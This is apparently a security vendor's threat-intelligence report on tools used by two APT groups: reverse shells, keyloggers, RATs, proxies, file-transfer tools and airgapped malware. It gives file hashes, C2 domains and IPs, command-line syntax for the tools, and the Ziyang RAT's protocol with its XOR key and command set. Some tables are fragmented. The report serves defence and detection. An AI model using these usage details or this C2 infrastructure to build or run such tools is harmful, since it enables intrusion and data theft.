The\nfirst set of indicators released by the NCCIC are associated with TG-8223, an APT group that targets the media, government,\nand defense sectors. The second set of indicators released by the NCCIC originate from an intrusion by TG-2754, an APT\ngroup that targets the technology, government, and defense sectors. The CTU research team has been tracking both of these\ngroups since 2006.\n\nThe majority of the released file hashes are associated with command-line file transfer and traffic proxy tools (BeepService,\nONHAT proxy, LinseningSvr, and SimpleFileMover) that accept command-line arguments for network endpoints. The\nSvcInstaller tool is used to establish persistence for separate DLL files that are not included in the corpus. Some indicators\nalso relate to DD Keylogger, jspRAT, and ZiyangRAT, which are remote access trojans (RATs) that include remote endpoints.\n\n## Tools and usage\n\nCTU researchers analyzed the binary files associated with the hash indicators provided by the NCCIC and determined they\nwere related to the following families of malware and tools:\n\nBeepService\nDD Keylogger\njspRAT\nLinseningSvr\nONHAT proxy\nSimpleFileMover\nSvcInstaller\nZiyang RAT\nAirgapped malware\n\nGiven that the indicators are from multiple incidents, it is not possible to create an accurate timeline or sequence for each tool's\nusage. The following sections briefly describe each family and include indicators associated with the referenced samples.\n\n## BeepService\n\nThe BeepService family of malware is used to create a reverse shell that connects to a specific command and control (C2)\nserver controlled by the attacker. BeepService requires the attacker to specify the following arguments on the command line:\n```\n> malware.exe [targetIP] [C2IP] [C2port] [RC4key] [Process to inject into] [service name] [filename]\n\n```\nThe malware is configured with default values that are overwritten by the options provided on the command line. Shellcode is\ninjected into the specified process on the target system. The BeepService malware does not establish persistence and does\nnot automatically start when the computer restarts. The specified [service name] and [filename] are for temporary use and are\nboth deleted after the shellcode has been injected into the configured process. The malware encrypts its communication to the\nC2 server using the RC4 algorithm and the [RC4key] specified on the command line.\n\n### Indicators\n\n\n-----\n\nCTU researchers analyzed the BeepService indicators in Table 1.\n\nIndicator Type Context\n\n18c66484e3129643a274086671da4efa MD5 hash Reverse shell to C2 server\n\n1f3c731aed7d8085eb2d15132819cb8b MD5 hash Reverse shell to C2 server\n\n3a282da31bf93cfaaa8b5a11d441483b MD5 hash Reverse shell to C2 server\n\n3aa3846284b6e7112da90e1d5e4e7711 MD5 hash Reverse shell to C2 server\n\n463a12f92652fc82b3c6e53bb917ecf2 MD5 hash Reverse shell to C2 server\n\n52b8063f663563d549ec414a7caf38f9 MD5 hash Reverse shell to C2 server\n\n54dc517c9f62dc5d435fb8bac0fd59f9 MD5 hash Reverse shell to C2 server\n\n660b856f485fb8fa0ecb3533d88d405e MD5 hash Reverse shell to C2 server\n\n6b8ea95a729551fde76a28244cb95ac1 MD5 hash Reverse shell to C2 server\n\n99f67381b3b389f0e6120603019e0ef9 MD5 hash Reverse shell to C2 server\n\na0f71497ca4c4c62c094c1843693381e MD5 hash Reverse shell to C2 server\n\ne8ee22223b6475d7b3ef8f51383df1ef MD5 hash Reverse shell to C2 server\n\n0625b5b010a1acb92f02338b8e61bb34 MD5 hash Reverse shell to C2 server\n\n4e95cb057f351af0f7c972800a07f350 MD5 hash Reverse shell to C2 server\n\n59534c90c3234fbdc82492d1c1b38e59 MD5 hash Reverse shell to C2 server\n\n726d77fe00b4c00df1bb2c5afd05ad21 MD5 hash Reverse shell to C2 server\n\nd5caf69c7a2ac416131133e0b1623066 MD5 hash Reverse shell to C2 server\n\n15cb44831bdd295bb3c0decf7cea0dc0 MD5 hash Reverse shell to C2 server\n\n2393b93a762d4990ec88d25c9e809510 MD5 hash Reverse shell to C2 server\n\n3c6ff8b69513bf338a2d5b3440b9a8cd MD5 hash Reverse shell to C2 server\n\n5e5917967bb61704a473b1ad20c36769 MD5 hash Reverse shell to C2 server\n\n73b8facac3e946354a89e58d308d8ebd MD5 hash Reverse shell to C2 server\n\n_Table 1. Indicators for the BeepService malware._\n\n## DD Keylogger\n\nDD Keylogger, sometimes referred to as Toyecma, was first observed in May 2013 and was used regularly through August\n2013 to target economic and monetary policy groups. This malware is distributed via spearphishing emails that contain EXE or\nSCR attachments masquerading as innocuous document files. DD Keylogger can record keyboard activity on a compromised\nsystem and then transmit that data to an attacker-controlled system. It can also download a second-stage payload typically\nknown as the Mswab/Aumlib RAT, which gives remote attackers complete control of a compromised system.\n\n### Indicators\n\nCTU researchers analyzed the DD Keylogger indicators in Table 2. The domains and IP addresses listed in the indicators table\nmay contain malicious content, so consider the risks before opening them in a browser.\n\nIndicator Type Context\n\n12b0e0525c4dc2510a26d4f1f2863c75 MD5 hash Keylogger, remote control\n\n\n-----\n\n78f2acc3309e1e743f98109a16c2b481 MD5 hash Keylogger, remote control\n\n96c28bddba400ddc9a4b12d6cc806aa3 MD5 hash Keylogger, remote control\n\n0e058126f26b54b3a4a950313ec5dbce MD5 hash Keylogger, remote control\n\nb13ab523e89d9bb055aee4d4566ab34f MD5 hash Keylogger, remote control\n\nstatus.acmetoy.com Domain name C2 domain\n\ngfans.onmypc.us Domain name C2 domain\n\narf.dns1.us Domain name C2 domain\n\n23.19.122.231 IP address C2 IP address\n\n198.199.75.95 IP address C2 IP address\n\n192.154.111.200 IP address C2 IP address\n\nDD5ShowNewsID String Campaign ID\n\nWW3-ID String Campaign ID\n\nArf2-ShowNewsID String Campaign ID\n\n_Table 2.

Relationships between DD Keylogger indicators._\n\n## jspRAT\n\n\nJuly 2013 Unknown arf.dns1.us 192.154.111.200\n(U.S.)\n\n\njspRAT is a JavaServer pages (JSP) web-based backdoor that can manipulate files and directories. The malware can also run\narbitrary Windows commands. jspRAT requires the victim's system to be running a JSP-enabled service such as the Apache\nTomcat open source web server. Communications take place over HTTP and may not be encrypted depending on the server's\nconfiguration.\n\n### Indicators\n\nCTU researchers analyzed the jspRAT indicators in Table 4.\n\nIndicator Type Context\n\n364691d4de2bbead973f31e06ecaf210 MD5 hash JSP web-based backdoor\n\n\n-----\n\n69f187a3072be5e6edf1486ad473016b MD5 hash JSP web-based backdoor\n\n79867b86281293c7f5e4aeccc51cfab9 MD5 hash JSP web-based backdoor\n\n_Table 4. Indicators for the jspRAT malware._\n\n## LinseningSvr\n\nLinseningSvr is used to transmit arbitrary fixed-size data chunks over an unencrypted channel. It sends or receives data from a\nuser-specified IP address and port, in clear text. The password is obscured with an MD5 hash. The tool requires the attacker to\nspecify the following arguments on the command line:\n```\n> malware.exe [local port] [password]\n\n```\nWhen LinseningSvr is executed, it opens a socket on the specified port and waits for connections. When a remote user\nconnects, LinseningSvr reads any two bytes sent and then attempts to read from a local file named \"c:\\1\". If this file exists,\nLinseningSvr sends the hashed password and 36 bytes from the file to the remote system as shown in Figures 1 and 2.\nLinseningSvr then attempts to delete the file and reports a \"Deleted c:\\1\" message if successful. The tool requires appropriate\npermissions to successfully execute the delete function. If LinseningSvr cannot delete the file, it displays a message that the\nfile could not be deleted. Due to a bug in the tool, the message that the file could not be deleted is followed by an inaccurate\nmessage that the file was deleted.\n\n_Figure 1. LinseningSvr sending hashed password and 36 bytes of data. (Source: Dell SecureWorks)_\n\n_Figure 2. System receiving hashed password and 36 bytes from LinseningSvr. (Source: Dell SecureWorks)_\n\nThe server also reads up to 272 bytes from the remote client. The first 16 bytes must be the same as the 16-byte hashed\npassword. Sent data is written to the c:\\2 file. LinseningSvr then repeats a loop of sleep and continues checking for the c:\\1 file.\nIf the bytes do not match, the message \"Password is Wrong!\" is printed to the server console.\n\n### Indicators\n\nCTU researchers analyzed the LinseningSvr indicators in Table 5.\n\nIndicator Type Context\n\na4fcff8ea2263e661889b030974a9166 MD5 hash File transfer server - broken PE\n\n\n-----\n\nb4634b18b8b1c24c117fc8c640916998 MD5 hash File transfer server - fixed PE\n\na462d9a24bc6175d356bec99d5e4eca8 MD5 hash File transfer server\n\n_Table 5. Indicators for the LinseningSvr malware._\n\n## ONHAT proxy\n\nThe ONHAT proxy redirects network traffic on a compromised host using SOCKS5 technology. The ONHAT proxy has similar\nfunctionality as the HTRAN malware, although the layout of the code is slightly different. The CTU research team believes\nONHAT proxy is a variant of HTRAN.\n\nONHAT has no persistence functionality and is invoked by a command-line tool using arguments. If arguments are not\nprovided, ONHAT attempts to read stored values from environment variables. The malware stores arguments that have been\ninvoked from the command line in environment variables. These arguments may include port number that the proxy feature\nlistens on.\n\nInternal strings and error messages frequently use the phrase \"ONHAT\". However, the environment variables use the phrase\n\"TAHNO\" (ONHAT backwards) when storing settings.\n\n### Indicators\n\nCTU researchers analyzed the ONHAT proxy indicators in Table 6.\n\nIndicator Type Context\n\n0f171ff1a80822934439edaa7be1023b MD5 hash SOCKS5 proxy server\n\n3f7601f0aeb5e391638a597c15f80c9f MD5 hash SOCKS5 proxy server\n\n5fa46b686c3a5e27fd4dfe0e1fbb1145 MD5 hash SOCKS5 proxy server\n\n9951f026f491ef90037a59f305269273 MD5 hash SOCKS5 proxy server\n\nb14ad1298928bb33613eb8e549c93e9e MD5 hash SOCKS5 proxy server\n\n35185b8c5e3cb928c97919aa5ad01315 MD5 hash SOCKS5 proxy server\n\n47803deb563d9ff917369b8c97c22a7e MD5 hash SOCKS5 proxy server\n\n89e9bed692611692e244ed294c9904cc MD5 hash SOCKS5 proxy server\n\na9a53cd80a12519429a9a40f9d34e563 MD5 hash SOCKS5 proxy server\n\ne4cdfa15a38034e6ae7f80334e7d6a14 MD5 hash SOCKS5 proxy server\n\n10d7989355b5fc2915a18004df4f9074 MD5 hash SOCKS5 proxy server\n\n156085a7cd31d272486193df10d7e26e MD5 hash SOCKS5 proxy server\n\n1a56c6eb1cd54ce642bdfd59168da127 MD5 hash SOCKS5 proxy server\n\n49361de55268ff2ee67add42d359248d MD5 hash SOCKS5 proxy server\n\n5a5d2c6fe70521efd875fecc961ff75a MD5 hash SOCKS5 proxy server\n\nd414c721c60df0282481df77c0c1cdae MD5 hash SOCKS5 proxy server\n\n356c9314ae95a18f3fef630e04f4d8b6 MD5 hash SOCKS5 proxy server (ASPACK packed)\n\n4734d158048c398f2ae44c035487e249 MD5 hash SOCKS5 proxy server (ASPACK packed)\n\na90194c071aefeb21331385ad7115fbc MD5 hash SOCKS5 proxy server (ASPACK packed)\n\n_Table 6. Indicators for the ONHAT proxy._\n\n\n-----\n\n## SimpleFileMover\n\nSimpleFileMover is used to transmit arbitrary files over an encrypted channel. It sends or receives a specified file to or from an\narbitrary IP address and port, encrypted with a key that is set at the command line. The following is the syntax for the\ncommand line:\n```\n> malware.exe [destinationIP] [port #] ['p' or 'g'] [filename] [RC4key]\n\n```\nWhen the tool is invoked with the 'p' option, the malware sends a local file specified by [filename] to the remote system on the\nport specified. The 'g' option retrieves a file from the remote system and saves it to [filename]. In most samples analyzed by\nCTU researchers, the entire transaction is encrypted with the RC4 algorithm. The RC4 key is also specified at the command\nline. One version of the analyzed samples takes only four arguments, omitting the [RC4key] option because it does not\nimplement crypto functions. This clear text version also produces verbose error messages.\n\nCTU researchers have also analyzed the corresponding server component for this attack tool. The server component listens\nfor connections from SimpleFileMover clients and then receives or transmits files as requested by the client malware. The\nfollowing command-line syntax starts the server:\n```\n> malware.exe [port #] [RC4key]\n\n```\nIf the listening port is not specified at the command line, the server listens by default on port 8080. If the RC4 key is omitted,\nSimpleFileMover defaults to '123'.\n\n### Indicators\n\nCTU researchers analyzed the SimpleFileMover indicators in Table 7.\n\nIndicator Type Context\n\n5d7c34b6854d48d3da4f96b71550a221 MD5 hash Transfer arbitrary files (RC4)\n\n9f546188e0955737deffc5cec8696d9a MD5 hash Transfer arbitrary files (RC4)\n\n9cf67106cd1644125b773133f83b3d64 MD5 hash Transfer arbitrary files (RC4)\n\n731089e10e20b13095df2624b6eb399f MD5 hash Transfer arbitrary files (No crypto, Debug version)\n\n00d0382fe1b02b529701a48a1ee4a543 MD5 hash Transfer arbitrary files (RC4)\n\n36093314059a9e7b95025437d523d259 MD5 hash Transfer arbitrary files (RC4)\n\n59ee8762316018862d7405b595267d8d MD5 hash Transfer arbitrary files (RC4)\n\n721c56a617dfd2cecade790d9e9fa9ce MD5 hash Transfer arbitrary files (RC4)\n\n8f73b7653ebf20f66a961cc39249b2e3 MD5 hash Transfer arbitrary files (RC4)\n\ndc1a284e82f4f38a628b84b0e43e65d5 MD5 hash Transfer arbitrary files (RC4)\n\nb7a68a8b6cac502ad0adcf18d33a34c9 MD5 hash Transfer arbitrary files (RC4) - pmj packed\n\na72d6dad860ca707e8abf18f771ed3f7 MD5 hash Transfer arbitrary files (RC4) - broken PE\n\n6130776a40971d0ca526fd23e16e36ab MD5 hash Transfer arbitrary files (RC4, Server version) - broken PE\n\nc460db6833e5542dede0bb04fdabdb59 MD5 hash Transfer arbitrary files (RC4, Server version) - fixed PE\n\n_Table 7. Indicators for the SimpleFileMover malware._\n\n## SvcInstaller\n\n\n-----\n\nThe SvcInstaller tool can install or uninstall itself as a Windows service, and it must be run as administrator. The SvcInstaller\nexecutable includes functionality to create a thread that loads a Dynamic Link Library (DLL) configured by the threat actor. This\nDLL includes two command-line options:\n\n-i (install service)\n-u (uninstall service)\n\nThe startup type of the malicious service is set \"Automatic,\" and the two known versions of this malicious service are named\n\"MSSPrv\" and \"UPSmgr\". SvcInstaller installs either MSSPrv or UPSmgr, and the installed service attempts to masquerade as\na legitimate service by using similar display names (see Tables 8 and 9).\n\nAttribute Legitimate service Malicious service\n\n\nService\nname\n\nDisplay\nname\n\nPath to\nEXE\n\n\nSwPrv MSSPrv\n\nMS Software Shadow Copy Provider MS Software Shadow\nProvider\n\nC:\\WINDOWS\\system32\\dllhost.exe /Processid:{GUID} Configured by threat actor\n\n\nDescription Manages software-based volume shadow copies taken by the Volume\nShadow Copy service.

Indicators for the SvcInstaller malware._\n\n## Ziyang RAT\n\n\n-----\n\nThe Ziyang family of malware is used to provide remote access to a compromised system. When executed, Ziyang connects to\na C2 server's domain name or IP address and port value, which have been encoded in the malware, to receive instructions and\nsend information. Ziyang can be used to upload, download, delete, or run files; search for files; list directory contents; and run\ncommands on the compromised system.\n\nZiyang uses a custom binary protocol to communicate with a C2 server. Packets include a 16-byte header, followed by a\ncompressed, encrypted payload. The header contains the following fields:\n\nFour-byte command string XOR-encoded with 0x9862ED7A\nPayload size\nRandom DWORD used as part of the payload crypto key\nHard-coded value from malware that may indicate a software version or specific campaign\n\nThe following example is network traffic generated by the Ziyang RAT:\n```\n0000  2a ae 2b dc 34 00 00 00 46 5d 45 2b 9d 64 b5 39 0010  fa 4d 15 07 1a 38 50 0b 1f fc 39 0e 23 7f 77 32 0020\n32 6f f5 5d 1e 7c 41 52 ab c5 30 59 b1 51 07 6f 0030  0e 18 58 2d 63 9a 03 7f 6b 41 0c 4d 35 70 02 35 0040  31 27\n2e 7b  0xdc2bae2a ^ 0x9862ED7A = 'PCID' \n\n```\nThe Ziyang RAT can use the decoded command strings listed in Table 11.\n\nOLEH LIST SHUT DIRF\n\nPCID KILL RESM FIND\n\nFILT PUTF SHOW DELF\n\nFILO GETF TYPE PIPE\n\nCLOS RUNF DISK FREE\n\nFILS SLEP CDDI\n\n_Table 11.

Indicators for the Ziyang RAT._\n\n## Airgapped malware\n\nThe malware samples in this group were constructed to control systems in situations where network communications are not\npossible or desired, such as an airgapped environment. Removable media transferred between compromised systems\ntransports specially encrypted command files and moves files and captured data between the malware's agent modules and\ncontroller module.\n\nOne sample in this malware group, identified as the control module, monitors removable media insertion on the infected\nsystem. The module then attempts to execute its commands to collect harvested data and queue additional tasks and files for\nthe agent modules. It can also selectively infect additional removable media by adding files and AutoRun configurations to the\nmedia. This module is hard-coded to self-terminate and clean up associated files when launched after June 21, 2013, so the\nspecific version of this tool described in the NCCIC release is probably not on any systems running as of this publication.\n\nThe \"agent\" samples in this malware group are data collection and system control modules. The agent receives command files\nand then executes commands associated with data collection, binary execution, and other arbitrary system commands. The\nspecific agent versions referenced in the NCCIC release are hard-coded to terminate and remove themselves from\ncompromised systems when launched after hard-coded dates. The agent module that appears to be the most current and\nassociated with the controller referenced in the NCCIC release has a self-termination date of May 31, 2013. The older agent\nmodule has a self-termination date of December 30, 2012. These dates suggest that these specific modules are probably not\non any systems running as of this publication.\n\nAgent modules can collect the following types of data:\n\nComputer and operating system details\nNetwork configuration\nUser account information\nDirectory listings for local and network drives on connected systems\nDomain or workgroup information\nPrimary and backup domain controller information\nArbitrary files from local and remote systems\n\n### Indicators\n\n\n-----\n\nThe modules do not contain any network indicators. These tools are most likely used in conjunction with other malware or\nremote access mechanisms, or rely on physical access.
